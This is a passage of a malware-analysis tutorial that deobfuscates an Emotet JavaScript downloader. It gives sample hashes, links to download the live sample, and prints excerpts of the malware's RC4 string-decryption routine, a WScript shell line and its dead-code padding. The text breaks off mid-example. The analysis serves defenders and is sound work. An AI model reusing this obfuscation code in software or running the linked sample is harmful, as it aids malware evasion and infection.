<li class="page_item page-item-3700"><a href="https://maxkersten.nl/projects/api-client-libraries/malware-bazaar-java-api-client/">Malware Bazaar Java API client</a></li>
<li class="page_item page-item-4185"><a href="https://maxkersten.nl/projects/api-client-libraries/yaraify-java-api-client/">Yaraify Java API client</a></li>
	</ul>
</li>
<li class="page_item page-item-2876"><a href="https://maxkersten.nl/projects/malwaretheflag/">MalwareTheFlag</a></li>
<li class="page_item page-item-2145"><a href="https://maxkersten.nl/projects/responsible-disclosures/">Responsible Disclosures</a></li>
<li class="page_item page-item-2430"><a href="https://maxkersten.nl/projects/malpull/">MalPull</a></li>
<li class="page_item page-item-104 menu-item-has-children"><a href="https://maxkersten.nl/projects/capricorn/">Capricorn<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-109"><a href="https://maxkersten.nl/projects/capricorn/changelog/">Changelog</a></li>
	</ul>
</li>
<li class="page_item page-item-2141 menu-item-has-children"><a href="https://maxkersten.nl/projects/archive/">Archive<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-163"><a href="https://maxkersten.nl/projects/archive/shouldersurfer/">ShoulderSurfer</a></li>
<li class="page_item page-item-167"><a href="https://maxkersten.nl/projects/archive/stringer/">Stringer</a></li>
<li class="page_item page-item-16 menu-item-has-children"><a href="https://maxkersten.nl/projects/archive/gemini/">Gemini<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
		<ul class='children'>
<li class="page_item page-item-73"><a href="https://maxkersten.nl/projects/archive/gemini/changelog/">Changelog</a></li>
		</ul>
</li>
<li class="page_item page-item-35"><a href="https://maxkersten.nl/projects/archive/whitepapers/">Whitepapers</a></li>
	</ul>
</li>
</ul>
</li>
<li class="page_item page-item-4 menu-item-has-children"><a href="https://maxkersten.nl/about-me/">About me<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-2436"><a href="https://maxkersten.nl/about-me/news-and-conferences/">News and conferences</a></li>
<li class="page_item page-item-198"><a href="https://maxkersten.nl/about-me/privacy-policy/">Privacy Policy</a></li>
</ul>
</li>
		</ul>
	</div><!-- .main-nav -->
			</div><!-- .inside-navigation -->
	</nav><!-- #site-navigation -->
		
	<div id="page" class="hfeed site grid-container container grid-parent">
		<div id="content" class="site-content">
			
	<div id="primary" class="content-area grid-parent mobile-grid-100 grid-75 tablet-grid-75">
		<main id="main" class="site-main">
						
				
<article id="post-2472" class="post-2472 page type-page status-publish" itemtype='http://schema.org/CreativeWork' itemscope='itemscope'>
	<div class="inside-article">
				
					<header class="entry-header">
				<h1 class="entry-title" itemprop="headline">Emotet JavaScript downloader</h1>			</header><!-- .entry-header -->
				
				<div class="entry-content" itemprop="text">
			<p><em>This article was published on the 8th of April 2020. This article was updated on the 8th of December 2021.</em></p>
<p>The Emotet trojan is dropped in multiple stages. The first stage is an office file that contains a macro. This macro then loads the second stage, which is either a PowerShell script or a piece of JavaScript. A PowerShell based downloader script that was used to downloaded the Emotet binary, is analysed in the <a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/">Emotet droppers</a> article. In this article, a JavaScript based downloader is analysed in the usual step-by-step manner. At first, the obfuscation methods are explained, after which the deobfuscated sample is analysed.</p>
<h2>Table of contents</h2>
<ul>
<li><a href="#sample-information">Sample information</a></li>
<li><a href="#analysis-outline">Analysis outline</a></li>
<li><a href="#deobfuscating-the-code">Deobfuscating the code</a></li>
<li><a href="#reconstructing-the-original-script">Reconstructing the original script</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<p><a name ="sample-information"></a></p>
<h2><a href="#sample-information">Sample information</a></h2>
<p>The JavaScript based downloader is lauched by a macro in a Word document. The hashes of both samples are given below. Additionally a sample package (which contains both files) can be downloaded from <a href="https://malshare.com/sample.php?action=detail&#038;hash=fb8eacb936940d255e856bbe8dfba277">MalShare</a>, <a href="https://bazaar.abuse.ch/sample/ddfedf6178d86d3372922620116d8c973e0627b5ac1ef087cc7c15cfcc452480/">Malware Bazaar</a>, or <a href="https://beta.virusbay.io/sample/browse/fb8eacb936940d255e856bbe8dfba277">VirusBay</a>.</p>
<pre>
Word document MD-5: 12c0a3f94e87c9c4baa70e63cbb8f132
Word document SHA-1: 219588d23f281f1fafad61780c115e1f61c7cd52
Word document SHA-256: 8d3de338b1f13c55c73461a24fef506de8733e392cd145cc3a6a843bab28ee3d

JavaScript MD-5: b23fd915ab76f0d3f79d90c7cbb87f54
JavaScript SHA-1: d8bd63db6475105200fbdcc09fcb1e1c4bbde190
JavaScript SHA-256: b47c3e2c8dd09054e1eec662db8ee433acb494467b6517a3a022cd7c399cef17
</pre>
<p>Note that this article only covers the JavaScript based downloader.</p>
<p><a name ="analysis-outline"></a></p>
<h2><a href="#analysis-outline">Analysis outline</a></h2>
<p>The JavaScript file is obfuscated using <a href="https://obfuscator.io/">Obfuscator.io</a>&#8216;s obfuscator. One can inspect the obfuscator&#8217;s source code to understand how it works. Its not often that the obfuscator&#8217;s source code is available, which is why its not used in this article. Understanding how to approach such a sample, and knowing how to recognise patterns in code, is a valuable skill to develop.</p>
<p><a name ="deobfuscating-the-code"></a></p>
<h2><a href="#deobfuscating-the-code">Deobfuscating the code</a></h2>
<p>This article will show six steps that are required to remove the obfuscation. Firstly, the original strings are retrieved. After that, multiple dead code variants are removed. Thirdly, the <em>dictionary</em> mappings within functions are addressed. Fourthly, the control flow is unflattened. Fifthly, the function overrides are explained. Lastly, function callbacks are addressed.</p>
<p>After the deobfuscation is complete, the original payload will be reconstructed and analysed step-by-step.</p>
<h3>Retrieving strings</h3>
<p>Within the sample, the strings are stored in a single array, as can be seen when scrolling through the code. The strings are obtained from this array during run time. The code below provides the string array, together with a function that alters the array.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> a <span class="sy0">=</span> <span class="br0">&#91;</span><span class="st0">'base64-encoded-value'</span><span class="sy0">,</span> <span class="st0">'another-base64-encoded-value'</span><span class="sy0">,</span> ... <span class="br0">&#93;</span><span class="sy0">;</span>
&nbsp;
<span class="br0">&#40;</span><span class="kw1">function</span><span class="br0">&#40;</span>c<span class="sy0">,</span> d<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> e <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span>f<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        while <span class="br0">&#40;</span><span class="sy0">--</span>f<span class="br0">&#41;</span> <span class="br0">&#123;</span>
            c<span class="br0">&#91;</span><span class="st0">'push'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>c<span class="br0">&#91;</span><span class="st0">'shift'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
    <span class="br0">&#125;</span><span class="sy0">;</span>
    e<span class="br0">&#40;</span><span class="sy0">++</span>d<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span><span class="br0">&#40;</span>a<span class="sy0">,</span> 0x13b<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The anonymous function shuffles the array&#8217;s order <em>0x13b</em> places, or <em>315</em> in decimal. Directly below that, a function is defined. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> b <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span>c<span class="sy0">,</span> d<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    c <span class="sy0">=</span> c <span class="sy0">-</span> 0x0<span class="sy0">;</span>
    <span class="kw1">var</span> e <span class="sy0">=</span> a<span class="br0">&#91;</span>c<span class="br0">&#93;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>b<span class="br0">&#91;</span><span class="st0">'glFLpC'</span><span class="br0">&#93;</span> <span class="sy0">===</span> <span class="kw2">undefined</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="br0">&#40;</span><span class="kw1">function</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            <span class="kw1">var</span> f <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                <span class="kw1">var</span> g<span class="sy0">;</span>
                <span class="kw1">try</span> <span class="br0">&#123;</span>
                    g <span class="sy0">=</span> <span class="kw4">Function</span><span class="br0">&#40;</span><span class="st0">'return<span class="es0">\x</span>20(function()<span class="es0">\x</span>20'</span> <span class="sy0">+</span> <span class="st0">'{}.constructor(<span class="es0">\x</span>22return<span class="es0">\x</span>20this<span class="es0">\x</span>22)(<span class="es0">\x</span>20)'</span> <span class="sy0">+</span> <span class="st0">');'</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
                <span class="br0">&#125;</span> <span class="kw1">catch</span> <span class="br0">&#40;</span>h<span class="br0">&#41;</span> <span class="br0">&#123;</span>
                    g <span class="sy0">=</span> window<span class="sy0">;</span>
                <span class="br0">&#125;</span>
                <span class="kw1">return</span> g<span class="sy0">;</span>
            <span class="br0">&#125;</span><span class="sy0">;</span>
            <span class="kw1">var</span> i <span class="sy0">=</span> f<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">var</span> j <span class="sy0">=</span> <span class="st0">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span><span class="sy0">;</span>
            i<span class="br0">&#91;</span><span class="st0">'atob'</span><span class="br0">&#93;</span> <span class="sy0">||</span> <span class="br0">&#40;</span>i<span class="br0">&#91;</span><span class="st0">'atob'</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span>k<span class="br0">&#41;</span> <span class="br0">&#123;</span>
                <span class="kw1">var</span> l <span class="sy0">=</span> <span class="kw4">String</span><span class="br0">&#40;</span>k<span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">'replace'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="co2">/=+$/</span><span class="sy0">,</span> <span class="st0">''</span><span class="br0">&#41;</span><span class="sy0">;</span>
                <span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw1">var</span> m <span class="sy0">=</span> 0x0<span class="sy0">,</span> n<span class="sy0">,</span> o<span class="sy0">,</span> p <span class="sy0">=</span> 0x0<span class="sy0">,</span> q <span class="sy0">=</span> <span class="st0">''</span><span class="sy0">;</span> o <span class="sy0">=</span> l<span class="br0">&#91;</span><span class="st0">'charAt'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>p<span class="sy0">++</span><span class="br0">&#41;</span><span class="sy0">;</span> ~o <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span>n <span class="sy0">=</span> m <span class="sy0">%</span> 0x4 <span class="sy0">?</span> n <span class="sy0">*</span> 0x40 <span class="sy0">+</span> o <span class="sy0">:</span> o<span class="sy0">,</span> m<span class="sy0">++</span> <span class="sy0">%</span> 0x4<span class="br0">&#41;</span> <span class="sy0">?</span> q <span class="sy0">+=</span> <span class="kw4">String</span><span class="br0">&#91;</span><span class="st0">'fromCharCode'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0xff <span class="sy0">&amp;</span> n <span class="sy0">&gt;&gt;</span> <span class="br0">&#40;</span><span class="sy0">-</span>0x2 <span class="sy0">*</span> m <span class="sy0">&amp;</span> 0x6<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">:</span> 0x0<span class="br0">&#41;</span> <span class="br0">&#123;</span>
                    o <span class="sy0">=</span> j<span class="br0">&#91;</span><span class="st0">'indexOf'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>o<span class="br0">&#41;</span><span class="sy0">;</span>
                <span class="br0">&#125;</span>
                <span class="kw1">return</span> q<span class="sy0">;</span>
            <span class="br0">&#125;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">var</span> r <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span>s<span class="sy0">,</span> d<span class="br0">&#41;</span> <span class="br0">&#123;</span>
            <span class="kw1">var</span> u <span class="sy0">=</span> <span class="br0">&#91;</span><span class="br0">&#93;</span><span class="sy0">,</span>
                v <span class="sy0">=</span> 0x0<span class="sy0">,</span>
                w<span class="sy0">,</span> x <span class="sy0">=</span> <span class="st0">''</span><span class="sy0">,</span>
                y <span class="sy0">=</span> <span class="st0">''</span><span class="sy0">;</span>
            s <span class="sy0">=</span> atob<span class="br0">&#40;</span>s<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw1">var</span> z <span class="sy0">=</span> 0x0<span class="sy0">,</span> A <span class="sy0">=</span> s<span class="br0">&#91;</span><span class="st0">'length'</span><span class="br0">&#93;</span><span class="sy0">;</span> z <span class="sy0">&lt;</span> A<span class="sy0">;</span> z<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                y <span class="sy0">+=</span> <span class="st0">'%'</span> <span class="sy0">+</span> <span class="br0">&#40;</span><span class="st0">'00'</span> <span class="sy0">+</span> s<span class="br0">&#91;</span><span class="st0">'charCodeAt'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>z<span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">'toString'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x10<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">'slice'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="sy0">-</span>0x2<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="br0">&#125;</span>
            s <span class="sy0">=</span> decodeURIComponent<span class="br0">&#40;</span>y<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw1">var</span> B <span class="sy0">=</span> 0x0<span class="sy0">;</span> B <span class="sy0">&lt;</span> 0x100<span class="sy0">;</span> B<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                u<span class="br0">&#91;</span>B<span class="br0">&#93;</span> <span class="sy0">=</span> B<span class="sy0">;</span>
            <span class="br0">&#125;</span>
            <span class="kw1">for</span> <span class="br0">&#40;</span>B <span class="sy0">=</span> 0x0<span class="sy0">;</span> B <span class="sy0">&lt;</span> 0x100<span class="sy0">;</span> B<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                v <span class="sy0">=</span> <span class="br0">&#40;</span>v <span class="sy0">+</span> u<span class="br0">&#91;</span>B<span class="br0">&#93;</span> <span class="sy0">+</span> d<span class="br0">&#91;</span><span class="st0">'charCodeAt'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>B <span class="sy0">%</span> d<span class="br0">&#91;</span><span class="st0">'length'</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">%</span> 0x100<span class="sy0">;</span>
                w <span class="sy0">=</span> u<span class="br0">&#91;</span>B<span class="br0">&#93;</span><span class="sy0">;</span>
                u<span class="br0">&#91;</span>B<span class="br0">&#93;</span> <span class="sy0">=</span> u<span class="br0">&#91;</span>v<span class="br0">&#93;</span><span class="sy0">;</span>
                u<span class="br0">&#91;</span>v<span class="br0">&#93;</span> <span class="sy0">=</span> w<span class="sy0">;</span>
            <span class="br0">&#125;</span>
            B <span class="sy0">=</span> 0x0<span class="sy0">;</span>
            v <span class="sy0">=</span> 0x0<span class="sy0">;</span>
            <span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw1">var</span> C <span class="sy0">=</span> 0x0<span class="sy0">;</span> C <span class="sy0">&lt;</span> s<span class="br0">&#91;</span><span class="st0">'length'</span><span class="br0">&#93;</span><span class="sy0">;</span> C<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                B <span class="sy0">=</span> <span class="br0">&#40;</span>B <span class="sy0">+</span> 0x1<span class="br0">&#41;</span> <span class="sy0">%</span> 0x100<span class="sy0">;</span>
                v <span class="sy0">=</span> <span class="br0">&#40;</span>v <span class="sy0">+</span> u<span class="br0">&#91;</span>B<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="sy0">%</span> 0x100<span class="sy0">;</span>
                w <span class="sy0">=</span> u<span class="br0">&#91;</span>B<span class="br0">&#93;</span><span class="sy0">;</span>
                u<span class="br0">&#91;</span>B<span class="br0">&#93;</span> <span class="sy0">=</span> u<span class="br0">&#91;</span>v<span class="br0">&#93;</span><span class="sy0">;</span>
                u<span class="br0">&#91;</span>v<span class="br0">&#93;</span> <span class="sy0">=</span> w<span class="sy0">;</span>
                x <span class="sy0">+=</span> <span class="kw4">String</span><span class="br0">&#91;</span><span class="st0">'fromCharCode'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>s<span class="br0">&#91;</span><span class="st0">'charCodeAt'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>C<span class="br0">&#41;</span> <span class="sy0">^</span> u<span class="br0">&#91;</span><span class="br0">&#40;</span>u<span class="br0">&#91;</span>B<span class="br0">&#93;</span> <span class="sy0">+</span> u<span class="br0">&#91;</span>v<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="sy0">%</span> 0x100<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="br0">&#125;</span>
            <span class="kw1">return</span> x<span class="sy0">;</span>
        <span class="br0">&#125;</span><span class="sy0">;</span>
        b<span class="br0">&#91;</span><span class="st0">'DeXxzd'</span><span class="br0">&#93;</span> <span class="sy0">=</span> r<span class="sy0">;</span>
        b<span class="br0">&#91;</span><span class="st0">'qjpvAF'</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="br0">&#123;</span><span class="br0">&#125;</span><span class="sy0">;</span>
        b<span class="br0">&#91;</span><span class="st0">'glFLpC'</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">var</span> D <span class="sy0">=</span> b<span class="br0">&#91;</span><span class="st0">'qjpvAF'</span><span class="br0">&#93;</span><span class="br0">&#91;</span>c<span class="br0">&#93;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>D <span class="sy0">===</span> <span class="kw2">undefined</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>b<span class="br0">&#91;</span><span class="st0">'dXYIcg'</span><span class="br0">&#93;</span> <span class="sy0">===</span> <span class="kw2">undefined</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            b<span class="br0">&#91;</span><span class="st0">'dXYIcg'</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
        e <span class="sy0">=</span> b<span class="br0">&#91;</span><span class="st0">'DeXxzd'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>e<span class="sy0">,</span> d<span class="br0">&#41;</span><span class="sy0">;</span>
        b<span class="br0">&#91;</span><span class="st0">'qjpvAF'</span><span class="br0">&#93;</span><span class="br0">&#91;</span>c<span class="br0">&#93;</span> <span class="sy0">=</span> e<span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
        e <span class="sy0">=</span> D<span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">return</span> e<span class="sy0">;</span>
<span class="br0">&#125;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>This function is called at places where a string is normally located in the script. An example of such a call is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1">b<span class="br0">&#40;</span><span class="st0">'0x0'</span><span class="sy0">,</span> <span class="st0">'(6q)'</span><span class="br0">&#41;</span></pre></div></div></div></div></div></div></div>


<p>The first parameter is the index of the value in the string array, as can be seen in the code excerpt below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> b <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span>c<span class="sy0">,</span> d<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    c <span class="sy0">=</span> c <span class="sy0">-</span> 0x0<span class="sy0">;</span>
    <span class="kw1">var</span> e <span class="sy0">=</span> a<span class="br0">&#91;</span>c<span class="br0">&#93;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The second argument is used in the decryption of he given string. Searching for some of the <em>magic</em> values, will lead to the conclusion that the <a href="https://en.wikipedia.org/wiki/RC4">RC4 encryption algorithm</a> is used, and is decrypted using this function. Note that the string array contains base64 encoded strings, as not all encrypted output is printable. As such, the decryption function base64 decodes the strings first, using the <a href="https://www.w3schools.com/jsref/met_win_atob.asp">atob</a> function. The refactored function template is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1">decrypt<span class="br0">&#40;</span>index<span class="sy0">,</span> rc4_key<span class="br0">&#41;</span></pre></div></div></div></div></div></div></div>


<p>Note that one can also find the usage of the RC4 encryption algorithm in the feature list of the obfuscator. As stated prior, this article does not rely on the feature list nor source code of the obfuscator, as this is not always available.</p>
<p>To clean the script, replace all occurrences of the decryption function with the result it returns for the given array. One can copy the string array and shuffle function into the browser&#8217;s console to obtain the shuffled and decrypted values, or automate the process with a script. A version of the script where all strings have been replaced is present in the file package that is provided in the beginning.</p>
<h3>Dead code removal</h3>
<p>Within the script, dead code is present in several ways. The two most occurring methods are the insertion of dead code in the form of variables and the creation of redundant if-statements. To avoid automatic removal of unused variables, the variables link to other dead code, thereby referencing each other. An example from the script is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> fS <span class="sy0">=</span> 0x1522c<span class="sy0">;</span>
<span class="kw1">var</span> fT <span class="sy0">=</span> 0x15cdc<span class="sy0">;</span>
<span class="kw1">var</span> fU <span class="sy0">=</span> 0x8b7aec<span class="sy0">;</span>
WshShell <span class="sy0">=</span> WScript<span class="br0">&#91;</span>cb<span class="br0">&#93;</span><span class="br0">&#40;</span>ck<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">var</span> fY <span class="sy0">=</span> 0xc1b1<span class="sy0">;</span>
<span class="kw1">var</span> fZ <span class="sy0">=</span> 0x2f3869<span class="sy0">;</span>
<span class="kw1">var</span> g0 <span class="sy0">=</span> 0x2d7f69<span class="sy0">;</span>
fY <span class="sy0">=</span> fZ <span class="sy0">+</span> fZ<span class="sy0">;</span>
fY <span class="sy0">=</span> fZ <span class="sy0">+</span> fY<span class="sy0">;</span>
fY <span class="sy0">=</span> fY <span class="sy0">+</span> fZ<span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Not all dead code references other dead code. An example of dead code without references is given below. Additionally, this excerpt contains a redundant if-statement. Only when the code is altered, statically or in-memory, the condition could be met.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span><span class="st0">&quot;JCqNE&quot;</span> <span class="sy0">===</span> <span class="st0">&quot;nUZVy&quot;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    that <span class="sy0">=</span> window<span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> eV <span class="sy0">=</span> 0xf2bd6<span class="sy0">;</span>
    <span class="kw1">var</span> eW <span class="sy0">=</span> 0x169e<span class="sy0">;</span>
    <span class="kw1">var</span> eX <span class="sy0">=</span> <span class="kw1">new</span> ce<span class="br0">&#40;</span>c6<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">var</span> eY <span class="sy0">=</span> 0xb66<span class="sy0">;</span>
    <span class="kw1">var</span> eZ <span class="sy0">=</span> 0x11c1d<span class="sy0">;</span>
    <span class="kw1">var</span> f0 <span class="sy0">=</span> <span class="st0">&quot;KT!Wd0rRAcucX*QYYufz tnIg;ORkuP1?c[op38[z?8ROFKHKLpH?dOB&lt;n,DmUDqnlm ZPP*::AsISG ^;Iwprss;@xyOXzLfbb &quot;</span><span class="sy0">;</span>
    <span class="kw1">var</span> f1 <span class="sy0">=</span> <span class="st0">&quot;g3sO31;W8 Bd h0@fwgfpIlmlIj 1BJ l2S6#gZ[TLq6f.em!J9n^W:a9;o&lt;ELSD^Qf Z9qwz?^doAeA[8;Z[n @kJeFqe2.:Yy.&quot;</span><span class="sy0">;</span>
    <span class="kw1">var</span> f2 <span class="sy0">=</span> <span class="st0">&quot;^8LUc?w0X%xOcUKoN @3EP,RPQ6yA#&lt;EDN.qo*dTEsue1bLG7A9 iFNAQt0Cb[dJoJw0lrDPK@,y:mWno9N%by1t U 37NaKs sf&quot;</span><span class="sy0">;</span>
    <span class="kw1">var</span> f3 <span class="sy0">=</span> 0x79219<span class="sy0">;</span>
    <span class="kw1">var</span> f4 <span class="sy0">=</span> <span class="st0">'<span class="es0">\x</span>5c'</span> <span class="sy0">+</span> <span class="kw4">Math</span><span class="br0">&#91;</span><span class="st0">'random'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">&quot;toString&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x24<span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">'substr'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x2<span class="sy0">,</span> 0x9<span class="br0">&#41;</span> <span class="sy0">+</span> c5<span class="sy0">;</span>
    <span class="kw1">var</span> f5 <span class="sy0">=</span> 0x1522<span class="sy0">;</span>
    <span class="kw1">var</span> f6 <span class="sy0">=</span> <span class="nu0">0.3686</span><span class="sy0">;</span>
    <span class="kw1">var</span> f7 <span class="sy0">=</span> eX<span class="br0">&#91;</span>c2<span class="br0">&#93;</span><span class="br0">&#40;</span>0x2<span class="br0">&#41;</span> <span class="sy0">+</span> f4<span class="sy0">;</span>
    <span class="kw1">var</span> f8 <span class="sy0">=</span> <span class="st0">&quot;xIs.f&lt;Abe.qi&lt;c8 dAyQZ EHMpUGgKXbX%htpP.JhQrAiDO. ,,aU2J:Bpi$KSUe,W;*f#l[a?JkQcy!t# fR^t.wdykHgFaRljJ&quot;</span><span class="sy0">;</span>
    <span class="kw1">var</span> f9 <span class="sy0">=</span> <span class="st0">&quot;gwE1Txw;Q.AD[#8lnj0Gc*bKtfY:Pc!$dIMQ210!ziIYSdUrg01]x OXOkB%9U#$S]$usPz@*]Koi?peC6sW@O. SZ D#mWYG?Eg&quot;</span><span class="sy0">;</span>
    <span class="kw1">return</span> f7<span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>In the code above, the body within the if-statement is unreachable. Therefore the code within the else-clause is executed. All variables are created within the condition, meaning they cease to exist outside of the else-body. In this case, <em>f7</em> is returned, which references <em>eX</em> and <em>f4</em>. Neither <em>eX</em> nor <em>f4</em> references a variable that is created within the else-body. As such, the content of the else-body can be rewritten without the garbage code. The rewritten excerpt is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> eX <span class="sy0">=</span> <span class="kw1">new</span> ce<span class="br0">&#40;</span>c6<span class="br0">&#41;</span><span class="sy0">;</span>
